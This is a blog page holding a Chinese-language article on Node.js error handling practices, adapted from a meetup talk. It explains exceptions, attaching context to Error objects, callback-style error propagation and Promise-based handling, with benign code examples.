<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Liunx Python Rust Goalng DevOPS" />










<meta name="description" content="个人随想，瞎子的世界">
<meta property="og:type" content="website">
<meta property="og:title" content="逐流小站">
<meta property="og:url" content="https://blog.feedscoin.com/page/48/index.html">
<meta property="og:site_name" content="逐流小站">
<meta property="og:description" content="个人随想，瞎子的世界">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Laird Lau">
<meta property="article:tag" content="Liunx Python Rust Goalng DevOPS">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.feedscoin.com/page/48/"/>





  <title>逐流小站</title>
  





<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-MW47YH6RH0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-MW47YH6RH0');
</script>





<meta name="generator" content="Hexo 7.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">逐流小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/10/03/2016/2016-10-03-nodejs-error-handling/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/10/03/2016/2016-10-03-nodejs-error-handling/" itemprop="url">Node.js 错误处理实践</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-03T00:00:00+08:00">
                2016-10-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <blockquote>
<p>这篇文章由我九月末在 <a target="_blank" rel="noopener" href="https://github.com/Hangzhou-Node-Party/slides">Node Patry 杭州</a> 进行的一次技术分享整理而来。</p>
</blockquote>
<p>今天我想介绍的是 Node.js 开发中一个很小，但又很重要的话题 —— 错误处理。作为一名软件工程师，我想我们应该都会认可「错误是无法避免的」，因此我们必须积极地去对待这些错误，才能写出健壮的代码。</p>
<p>首先，我想先介绍一下我们理想的错误处理是什么样的：</p>
<ul>
<li>出现错误时能将任务中断在一个合适的位置</li>
<li>能记录错误的摘要、调用栈及其他上下文</li>
<li>通过这些记录能够快速地发现和解决问题</li>
</ul>
<p>通常一个大的任务是由很多小的步骤构成的，很多时候当一个步骤中发生了错误，你并不能放任它在这里中断。我又要举那个经典的例子了：两个人，A 向 B 转账，当从 A 的账户扣完钱要加到 B 的账户上的时候发生了错误，这时显然你不能让整个任务中断在这里，否则就会出现数据的不一致 —— A 的账户被扣了钱但没有被加到其他任何账户上。因此我们需要通过错误处理精心地控制错误中断的位置，在必要的情况下回滚数据，确保数据的一致性。</p>
<p>我们的程序也需要在出现错误的情况下能够显示（或记录）一个错误的摘要、调用栈，以及其他的上下文。调用栈通常语言本身会提供，但很多时候仅有调用栈是不足以定位问题的，所以我们还需要去记录那些可能与这个错误有关的「上下文」，比如当时某几个关键的变量的值。对于一个服务器端项目，如果我们决定不向用户展示错误的详情，可能还需要为用户提供一个唯一的错误编号，以便用户事后反馈的时候我们可以根据编号还原当时的现场。</p>
<p>我也要举一些反面的例子，我们不希望错误处理是这样的：</p>
<ul>
<li>出现错误后程序崩溃退出</li>
<li>出现错误后 HTTP 请求无响应</li>
<li>出现错误后数据被修改了「一半」，出现不一致</li>
<li>出现错误后没有记录日志或重复记录</li>
<li>在日志中打印了错误但没有提供调用栈和上下文</li>
</ul>
<p>在 Node.js 程序中经常会出现 HTTP 请求无响应的情况 —— 既没有收到成功响应，也没有收到失败响应，一直在保持着连接。这通常是由于回调函数中的代码抛出了一个异常但没有被正确地捕捉，导致对这个请求的处理流程被意外地中断了，后面我们会介绍如何写出健壮的异步代码。</p>
<p>有的数据库会提供回滚事务的功能，但有的时候我们在使用非事务的数据库，或者在操作临时文件或其他的外部资源，这时就需要我们自己在出现错误的时候来回滚数据了。</p>
<p>出现错误有没有记录或记录不全也是一个非常糟糕的情况，这会让你无从定位错误，你不得不去排查代码的每一个路径，通过用日志打点的方式排查错误发生在哪里；或者虽然打印了错误但没有调用栈或上下文，这也会给你定位错误带来一些不便；再或者一旦一个错误发生了，整个程序里所有相关的函数调用都在打印这个错误，造成日志被错误刷屏，虽然不是大问题，但也会让人感到烦躁。</p>
<h2 id="层次化架构"><a href="#层次化架构" class="headerlink" title="层次化架构"></a>层次化架构</h2><p>前辈们说过「计算机领域内的任何问题都可以通过添加一个抽象层的方法来解决」，当我们需要维护一个规模较大的项目时，通常会选择一种层次化的架构：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2016/layers.png"></p>
<p>其实我们通常提到的 MVC 就算是一种层次化架构，但我在这里展示了一个更为通用的架构：左侧的 Dispatcher 指程序的入口点，对于 Web 后端来说可能是解析 HTTP 请求，分发到对应处理函数的部分；对于 GUI 程序来说可能是接受用户输入的部分；对于命令行程序来说可能是解析命令行参数的部分。</p>
<p>在来自外部的任务被 Dispatcher 转换为内部表示之后，会进入到业务逻辑层，这部分是一个程序最复杂也是最核心的部分，它的内部可能还会被划分为若干个小的模块和层次。</p>
<p>最后，我觉得无论是什么程序，最后都要去操作数据，这就是图中的 Date Access 层。对于服务器端程序来说可能会直接连接到一个数据库；对于客户端程序来说可能会使用一个 HTTP Client 去操作远程的数据。</p>
<p>那么如果在这样一个复杂的层次化架构中，某个环节发生了错误怎么办？我们很可能会面临一个问题：<strong>我们在某一个层级可能没有足够的信息去决定如何处理这个错误</strong>。例如在 Data Access 层，一个数据库查询发生了错误，在 Data Access 这一层我们并不知道这个失败的查询对于更上层的业务逻辑意味着什么，而仅仅知道这个查询失败了。</p>
<p>所以我们需要有一种机制，<strong>将错误从底层不断地向上层传递，直到错误到达某个层级有足够的信息去决定如何处理这个错误</strong>。例如一个数据库查询的失败，根据不同的业务逻辑，可能会采取忽略、重试、中断整个任务这些完全不同的处理方式。</p>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>好在 JavaScript 为我们提供了异常（Exception）这样一个特性。异常是现代的高级语言所提供的一种非常强大的流程控制机制，我说它是流程控制机制，是说它和 if-else、for、while 其实是差不多的，都是用来进行流程控制的。异常让原本唯一的、正确的执行路径变得可以从任何一处中断，并进入一个所谓的「异常处理流程」。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="title function_">step1</span>();</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">stack</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="title function_">step2</span>()</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( ... )</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;some error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在前面的例子中，我们定义了 step1 和 step2 两个函数，step1 调用了 step2，而 step2 中有可能抛出一个异常。我们仅需将对 step1 的调用放在一个 try 的语句块里，便可在后面的 catch 块中捕捉到 step2 抛出的异常，而不需要在 step1 和 step2 中进行任何处理 —— 即使它们再调用了其他函数。</p>
<p>这是因为异常会随着调用栈逆向地回溯，然后被第一个 catch 块捕捉到。这恰好符合我们前面提到的需求：在某个较底层（调用层次较深）的函数中我们没有足够的信息去处理这个错误，我们便不必在代码中特别地处理这个错误，因为异常会沿着调用栈回溯，直到某个层次有信息去处理这个异常，我们再去 catch, 一旦一个异常被 catch 了，便不会再继续回溯了（除非你再次 throw），这时我们称这个异常被处理了。</p>
<blockquote>
<p>P.S. 下文中我们会同时使用「错误」和「异常」这两个词，它们之间的差别比较微妙：错误通常用来表示广义的不正确、不符合预期的情况；异常则具体指 JavaScript 或其他很多语言中提供的一种流程控制机制，以及在这个机制中被传递的异常对象。</p>
</blockquote>
<p>也有很多语言是没有异常的支持的，例如 C 和 Golang, 让我们来想象一下没有异常的 JavaScript 会是什么样子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err = <span class="title function_">step1</span>();</span><br><span class="line"><span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">var</span> err = <span class="title function_">step2</span>();</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="string">&#x27;step1: &#x27;</span> + err;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( ... )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;step2: some error&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有异常，每个函数都必须提供一种方式，告诉它的调用者是否有错误发生，在这里我们选择通过返回值的方式来表示错误，即如果返回空代表执行成功，返回了非空值则表示发生了一个错误。可以看到在每一次函数调用时，我们都需要去检查返回值来确定是否发生了错误，如果有错误发生了，就要提前中断这个函数的执行，将同样的错误返回。如果 step1 或 step2 中再去调用其他的函数，也需要检查每个函数的返回值 —— 这是一项非常机械化的工作，即使我们不去处理错误也必须手动检查，并在有错误时提前结束。</p>
<p>语言内建的异常还提供了另外一项非常有用的功能，那就是调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Error: some error</span><br><span class="line">    at step2 (~/exception.js:14:9)</span><br><span class="line">    at step1 (~/exception.js:9:3)</span><br><span class="line">    at &lt;anonymous&gt; (~/exception.js:2:3)</span><br></pre></td></tr></table></figure>

<p>这是前面的例子中打印出的调用栈，调用栈中越靠上的部分越接近异常实际产生的位置，而下面的调用栈则会帮助我们的还原程序执行的路径。调用栈是 JavaScript 引擎为我们提供的功能，如果没有异常的话，恐怕就需要我们自己来维护调用栈了。</p>
<h2 id="抛出一个异常"><a href="#抛出一个异常" class="headerlink" title="抛出一个异常"></a>抛出一个异常</h2><p>我在这里把异常粗略地分为两类：</p>
<ul>
<li>预期的异常：参数不合法、前提条件不满足</li>
<li>非预期的异常：JavaScript 引擎的运行时异常</li>
</ul>
<p>预期的异常通常是我们在代码中主动抛出的，目的是为了向调用者报告一种错误，希望外部的逻辑能够感知到这个错误，在某些情况下也可能是希望外部的逻辑能够给用户展示一个错误提示。</p>
<p>非预期的异常通常说明我们的程序有错误或者考虑不周到，比如语法错误、运行时的类型错误。或者也可能是来自依赖的库的错误，在实践中我们通常会把来自依赖库中的错误，捕捉后再次以特定的格式抛出，将其简单地「转化」为预期的异常。</p>
<p>那么，如果我们要主动抛出一个异常，应该怎样做呢：</p>
<ul>
<li>总是抛出一个继承自 Error 的对象</li>
<li>慎用自定义的异常类型</li>
<li>可以直接向异常上附加属性来提供上下文</li>
</ul>
<p>首先你应该总是抛出一个继承自 JavaScript 内建的 Error 类型的对象，而不要抛出 String 或普通的 Object, 因为只有语言内建的 Error 对象上才会有调用栈，抛出其他类型的对象将可能会导致调用栈无法正确地被记录。同时也要慎重地使用自定义的异常类型，因为目前 JavaScript 中和调用栈有关的 API（如 <code>Error.captureStackTrace</code>）还不在标准中，各个引擎的实现也不同，你很难写出一个在所有引擎都可用的自定义异常类型。因此如果你的代码可能会同时运行在 Node.js 和浏览器中，或者你在编写一个开源项目，那么建议你不要使用自定义的异常类型；如果你的代码不是开源的，运行环境也非常确定，则可以考虑使用引擎提供的私有 API 来自定义异常类型。</p>
<p>另外这里的建议不仅适用于传递给 throw 关键字的异常对象，也适用于传递给 callback 函数的第一个参数。</p>
<p>前面我们几次提到「上下文」的这个概念，所谓上下文就是说和这个错误有关的一些信息，这个「有关」可能是非常主观的，即你觉得那些有助于你定位错误的信息。借助于 JavaScript 灵活的类型机制，我们可以向任意对象上附加任意的属性，异常对象也不例外：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Permission denied&#x27;</span>);</span><br><span class="line">err.<span class="property">statusCode</span> = <span class="number">403</span>;</span><br><span class="line"><span class="keyword">throw</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> err = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Error while downloading&#x27;</span>);</span><br><span class="line">err.<span class="property">url</span> = url;</span><br><span class="line">err.<span class="property">responseCode</span> = res.<span class="property">statusCode</span>;</span><br><span class="line"><span class="keyword">throw</span> err;</span><br></pre></td></tr></table></figure>

<p>前面一个例子中，当一个请求无权限访问数据时，我们在抛出的异常对象上添加了一个 <code>statusCode = 403</code> 的属性，这个属性将会提示最终处理这个错误的 HTTP 层代码，给客户端发送 409 的错误响应；后面一个例子是在下载一个文件时发生了错误，当出现了这样的情况，显然我们最感兴趣的会是下载的地址是什么、服务器发回了怎样的响应，所以我们选择将这两个信息附加到异常对象上，供外层的逻辑读取。</p>
<h2 id="异步任务"><a href="#异步任务" class="headerlink" title="异步任务"></a>异步任务</h2><p>目前为止我们提到的都是 JavaScript 语言内建的异常特性，但因为语言内建的异常是基于调用栈的，所以它只能在「同步」的代码中使用。当我们刚刚入门 Node.js 时经常会搞不清这一点：「异步」任务是通过所谓的「事件队列」来实现的，每当引擎从事件队列中取出一个回调函数来执行时，实际上这个函数是在调用栈的最顶层执行的，如果它抛出了一个异常，也是无法沿着调用栈回溯到这个异步任务的创建者的。</p>
<p>所以你无法在异步代码中直接使用 try … catch 来捕捉异常，因此接下来我们会介绍如何在异步的代码中使用类似异常的机制来处理错误，在这里我粗略地将 Node.js 中常见的异步流程控制机制分为下面三大类：</p>
<ul>
<li>Node.js style callback</li>
<li>Promise（co、async&#x2F;await）</li>
<li>EventEmitter（Stream）</li>
</ul>
<p>首先是影响了几乎所有 Node.js 程序员的 Node.js style callback:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to, callback</span>) &#123;</span><br><span class="line">  fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>, <span class="function">(<span class="params">err, buffer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="title function_">callback</span>(err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        fs.<span class="title function_">writeFile</span>(to, buffer, callback);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="title function_">callback</span>(err);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="title function_">copyFileContent</span>(<span class="keyword">from</span>, to, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在这里以一个 copyFileContent 函数为例，它从第一个参数所代表的源文件中读取内容，然后写入到第二个参数所代表的目标文件。</p>
<p>首先需要注意的是在每次回调中，我们都需要去检查 err 的值，如果发现 err 有值就代表发生了错误，那么需要提前结束，并以同样的错误调用 callback 来将错误传递给调用者。</p>
<p>然后在回调中的代码也必须要包裹在 try … catch 中来捕捉同步的异常，如果捕捉到了同步的异常，那么也需要通过 callback 将错误传递给调用者。这里是一个比较大的坑，很多人会忘记，但按照 Node.js style callback 的风格，一个函数既有可能同步地抛出一个异常，也有可能异步地通过 callback 报告一个错误，Node.js 标准库中的很多函数也是如此。</p>
<p>在使用这个 copyFileContent 时，我们也需要同时去捕捉同步抛出的异常和异步返回的错误，实际上这样导致了错误情况下的逻辑分散到了两处，实在让人有些难以接受。</p>
<p>我们来总结一下使用 Node.js style callback 时琐碎的细节：</p>
<ul>
<li>需要同时处理同步的异常和异步的回调</li>
<li>在每次回调中需要检查 err 的值</li>
<li>回调中的代码也需要捕捉同步异常</li>
</ul>
<p>最后确保：无论成功或失败，要么 callback 被调用，要么同步地抛出一个异常。</p>
<p>我们需要在每个回调中检查 err 的值，如果有值就立刻调用 callback 并不再执行接下来的逻辑，确保错误被传递给调用者。仔细想想，这个做法和我们一开始展示的「没有异常的 JavaScript」是多么地相似！我们必须手动地去完成错误的传递工作，而且中间有很多容易被遗漏的琐碎细节。这也是为什么后来 Promise 得到了大家的认可，逐步取代了 Node.js style callback.</p>
<p>那么为什么 Node.js 会选择 callback style 而不是 Promise 作为标准库的接口呢？很大程度上是因为在 Node.js 刚刚发布时，Promise 还未进入 ECMAScript 的标准，Node.js 认为标准库应该提供最简单、最基本的接口，而使用 Promise 意味着 Node.js 还需要在标准库中内建一个 Promise 的实现，引入了额外的复杂度。如果用户希望使用 Promise 风格的标准库，大可以自己封装一个或选择第三方的封装，而标准库本身依然提供着最「简单」的接口。</p>
<p>所以接下来我们来看 Promise:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>).<span class="title function_">then</span>( <span class="function">(<span class="params">buffer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fs.<span class="title function_">writeFile</span>(to, buffer);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">try</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">copyFileContent</span>(<span class="keyword">from</span>, to);</span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Promise 可以说是对同步任务和异步任务的一种一致的抽象，算是 Node.js 中异步流程控制的未来趋势，今天我们不过多介绍 Promise, 而是着重来看它对于错误处理的影响。</p>
<p>Pormise 的版本相比于前面的 Node.js style callback 要短了许多，主要是我们不需要在 copyFileContent 中处理错误了，而只需要去考虑正常的流程。<code>fs.readFile</code>、<code>fs.writeFile</code> 和 copyFileContent 的返回值都是一个 Promise, 它会帮助我们传递错误，在 Promise 上调用 <code>.then</code> 相当于绑定一个成功分支的回调函数，而 <code>.catch</code> 相当于绑定一个失败分支的错误处理函数，实际上我们的代码已经非常类似于语言内建的异常机制了。</p>
<p>我也要介绍一些在使用 Promise 过程中的最佳实践，首先是要尽量避免手动创建 Promise:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>( <span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>, <span class="function">(<span class="params">err, buffer</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="title function_">reject</span>(err);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          fs.<span class="title function_">writeFile</span>(to, buffer, resolve);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Promise 也有一个构造函数，通常用于将一段 Node.js style callback 风格的逻辑封装为 Promise, 在其中你需要手动在成功或失败的情况下调用 resolve 或 reject, 也需要手动处理 Node.js style callback 中各种琐碎的细节，十分容易出现疏漏。</p>
<p>取而代之的是，我们应该使用类似于 bluebird 提供的 <code>Promise.promisify</code> 这样的函数自动地帮我们完成转换，<code>Promise.promisify</code> 接受一个 Node.js style callback 风格的函数然后帮助我们自动转换到返回 Promise 的函数，虽然其内部和我们前面手动转换的例子差不多，但使用它可以避免直接面对复杂的转换逻辑，减少犯错的可能性：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">promisify</span>(fs.<span class="property">readFile</span>)(<span class="keyword">from</span>).<span class="title function_">then</span>( <span class="function">(<span class="params">buffer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">promisify</span>(fs.<span class="property">writeFile</span>)(to, buffer);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至于 co&#x2F;generator 和 async&#x2F;await，我觉得它们和 Promise 并没有什么本质上的区别，而且它们最后也提供了和 Promise 相兼容的 API, 因此接下来我们只是简单地一笔带过。</p>
